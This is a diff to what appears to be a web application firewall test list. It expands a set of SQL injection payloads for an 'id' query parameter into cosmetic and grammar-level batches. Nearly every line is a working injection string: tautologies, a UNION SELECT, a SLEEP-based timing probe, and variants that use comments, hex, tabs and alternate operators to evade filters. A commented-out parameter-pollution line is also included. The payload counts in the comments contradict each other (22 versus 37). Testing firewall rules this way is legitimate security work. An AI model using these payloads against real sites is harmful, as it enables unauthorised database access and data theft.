@@ -1,4 +1,20 @@
-# Phase 4 batch 2 - grammar-based SQLi (all blocked, 942100)
+# Phase 4 - SQL injection matrix (GET id=...)
+# 22 payloads = batch 1 (cosmetic, 12) + batch 2 (grammar, 10)
+# Markers: <TAB> = tab character, <NL> = newline
+# --- batch 1: cosmetic transformations ---
+1' OR '1'='1'-- -
+1'/**/OR/**/'1'='1'-- -
+1'/*!50000OR*/1=1-- -
+1' OR 0x31=0x31-- -
+1' OR 1e0=1-- -
+1' oR '1'='1'-- -
+1' UNION SELECT 1,2-- -
+1'<TAB>OR<TAB>1=1-- -
+1' OR 1=1#
+1' OR CHAR(0x31)=CHAR(0x31)-- -
+1' AND SLEEP(5)-- -
+1' AND 'a'='a'-- -
+# --- batch 2: grammar-level variants ---
 1' AND 1 LIKE 1-- -
 1' AND 'a' LIKE 'a'-- -
 1' AND 1 BETWEEN 0 AND 2-- -
@@ -9,5 +25,5 @@
 1' AND ASCII('a')=97-- -
 1' AND STRCMP('a','a')=0-- -
 1' AND 1<=>1-- -
-# HPP
-?id=1&id=1' OR 1=1-- -
+# HPP (not part of the 37, tested separately in Phase 4)
+# ?id=1&id=1' OR 1=1-- -
